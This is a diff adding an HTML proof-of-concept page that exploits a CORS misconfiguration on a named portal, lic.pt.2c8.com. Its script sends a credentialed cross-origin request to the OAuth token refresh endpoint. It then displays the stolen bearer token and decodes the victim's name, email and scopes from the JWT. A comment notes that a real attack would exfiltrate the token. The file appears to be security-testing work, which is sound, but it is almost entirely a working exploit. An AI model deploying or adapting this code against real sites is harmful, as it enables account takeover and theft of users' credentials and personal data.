@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Token Theft PoC - lic.pt.2c8.com</title>
+    <style>
+        body { font-family: monospace; margin: 2em; background: #1a1a1a; color: #0f0; }
+        pre { background: #000; padding: 1em; border: 1px solid #333; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+        h1 { color: #f90; }
+        .fail { color: #f33; }
+        .success { color: #0f0; }
+        button { font-size: 1.2em; padding: 0.5em 1.5em; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>CORS Account Takeover PoC</h1>
+    <p>Target: https://lic.pt.2c8.com/portal/api/v2/oauth/token?refresh=true</p>
+    <p>This page attempts to steal a Bearer token cross-origin using the JSESSIONID cookie.</p>
+    <button onclick="exploit()">Run Exploit</button>
+    <h2>Result:</h2>
+    <pre id="output">Click the button while logged into the 2c8 portal...</pre>
+
+    <script>
+    async function exploit() {
+        const output = document.getElementById('output');
+        output.textContent = '[*] Sending cross-origin credentialed request to token refresh endpoint...\n';
+
+        try {
+            const resp = await fetch(
+                'https://lic.pt.2c8.com/portal/api/v2/oauth/token?refresh=true',
+                { credentials: 'include' }
+            );
+
+            output.textContent += '[*] Response status: ' + resp.status + '\n';
+            output.textContent += '[*] CORS header: ' + resp.headers.get('access-control-allow-origin') + '\n\n';
+
+            if (resp.ok) {
+                const data = await resp.json();
+                output.textContent += '[+] TOKEN STOLEN SUCCESSFULLY\n\n';
+                output.textContent += '[+] Token type: ' + data.token_type + '\n';
+                output.textContent += '[+] Expires at: ' + new Date(data.expires_at * 1000).toISOString() + '\n';
+                output.textContent += '[+] Roles: ' + JSON.stringify(data.roles) + '\n\n';
+                output.textContent += '[+] Access token (first 80 chars):\n';
+                output.textContent += data.access_token.substring(0, 80) + '...\n\n';
+
+                try {
+                    const payload = JSON.parse(atob(data.access_token.split('.')[1]));
+                    output.textContent += '[+] Victim identity from JWT:\n';
+                    output.textContent += '    Name: ' + payload.name + '\n';
+                    output.textContent += '    Email: ' + payload.email + '\n';
+                    output.textContent += '    Sub: ' + payload.sub + '\n';
+                    output.textContent += '    Scope: ' + payload.scope + '\n';
+                } catch(e) {}
+
+                output.textContent += '\n[!] In a real attack, this token would now be exfiltrated to the attacker\'s server.';
+                output.className = 'success';
+            } else {
+                output.textContent += '[-] Request returned ' + resp.status + ' — user may not be logged in.\n';
+                output.className = 'fail';
+            }
+        } catch (err) {
+            output.textContent += '[-] Request failed: ' + err.message + '\n';
+            output.textContent += '[-] CORS may be blocking the request (vulnerability not present).\n';
+            output.className = 'fail';
+        }
+    }
+    </script>
+</body>
+</html>
